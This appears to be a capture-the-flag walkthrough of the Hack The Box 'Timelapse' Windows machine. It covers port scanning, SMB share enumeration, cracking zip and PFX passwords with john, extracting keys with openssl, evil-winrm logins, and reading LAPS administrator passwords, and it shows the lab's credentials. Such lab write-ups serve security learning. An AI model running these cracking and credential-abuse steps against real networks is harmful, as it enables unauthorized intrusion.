---
icon: windows
---

# Timelapse - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.152 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 22:43 EDT
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.25s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-14 11:01:43Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-10-14T11:03:22+00:00; +8h00m02s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49668/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
49729/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-14T11:02:44
|_  start_date: N/A
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   56.36 ms  10.10.16.1
2   371.99 ms timelapse.htb (10.10.11.152)
```

Nmap identified the domain name `timelapse.htb` I will add it to `/etc/hosts`

```
10.10.11.152	timelapse.htb
```

### <mark style="color:$primary;">DNS Enumeration</mark>

{% code overflow="wrap" %}
```bash
dnsenum --dnsserver 10.10.11.152 -f ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt timelapse.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2702).png" alt=""><figcaption></figcaption></figure>

Thanks to this we know that his machine is also the DC \[Domain Controller]let's add it to our `/etc/hosts` file

```
10.10.11.152	timelapse.htb dc01.timelapse.htb
```

### <mark style="color:$primary;">SMB Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

I am going to take a look at the Shares folder

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

**LAPS \[Local Administrator Password Solution]** manages local admin passwords through the domain, ensuring each system has a unique, automatically rotated password. Without it, teams often rely on shared credentials, increasing the risk of lateral movement if an attacker gains access

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

The zip archive is password protected I will use zip2john to get a hash and try to crack it

```bash
zip2john winrm_backup.zip > zip.hash
```

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

#### Cracking Hash

```bash
john zip.hash -w=/usr/share/wordlists/rockyou.txt
```

```bash
john zip.hash --show
```

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

let's see what is inside the zip folder

<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

I'll use `openssl`  to extract the private key and certificate \[public key] from the `.pfx` file

{% code overflow="wrap" %}
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out legacyy_dev_auth.key
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

This is password protected as well I'll use pfx2john to generate a hash for it

```bash
pfx2john legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash
```

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

#### Cracking pfx hash

```bash
john legacyy_dev_auth.pfx.hash -w=/usr/share/wordlists/rockyou.txt
```

```bash
john legacyy_dev_auth.pfx.hash --show
```

<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

#### Extract Keys

I can extract the key and certificate now. For the PEM pass phrase you can put anything you want it has to be at least 4 characters. I'll use 1234

{% code overflow="wrap" %}
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out legacyy_dev_auth.key-enc
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

I’ll decrypt the key using the password I set above

```bash
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
```

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

dump the certificate -> Import Password: `thuglegacy`

{% code overflow="wrap" %}
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy_dev_auth.crt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

I'll use the keys to connect via evil-winrm

* `-S` -> Enable SSL, because I’m connecting to 5986;
* `-c legacyy_dev_auth.crt` -> provide the public key certificate
* `-k legacyy_dev_auth.key` -> provide the private key
* `-i timelapse.htb` -> host to connect to

{% code overflow="wrap" %}
```bash
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacy_dev_auth.crt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

**Powershell History**

{% code overflow="wrap" %}
```powershell
type C:\Users\legacyy\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

Found credentials for the svc\_deploy user in the history file.

### <mark style="color:$primary;">Shell as svc\_deploy</mark>

{% code overflow="wrap" %}
```bash
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

svc\_deploy is in the LAPS\_Readers group. This implies svc\_deploy can read from LAPS

With LAPS, the DC manages the local administrator passwords for computers on the domain. It is common to create a group of users and give them permissions to read these passwords, allowing the trusted administrators access to all the local admin passwords

### <mark style="color:$primary;">Read LAPS Password</mark>

```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

With the administrators password, let's get a shell as him

{% code overflow="wrap" %}
```bash
evil-winrm -i timelapse.htb -u administrator -p 'D.-9Ja56O(+5$91gO68e[;6Y' -S
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
